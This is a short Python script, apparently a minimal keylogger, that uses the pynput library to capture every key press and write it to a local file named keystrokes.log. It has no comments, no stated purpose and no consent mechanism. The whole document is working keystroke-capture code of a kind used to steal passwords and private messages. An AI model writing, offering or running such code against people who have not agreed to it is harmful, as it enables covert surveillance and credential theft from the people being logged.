from pynput import keyboard
import time

def on_key(key):
    try:
        log_file.write(str(key.char))
    except AttributeError:
        log_file.write(str(key))

log_file = open("keystrokes.log", "w")

with keyboard.Listener(on_press=on_key) as listener:
    listener.join()

log_file.close()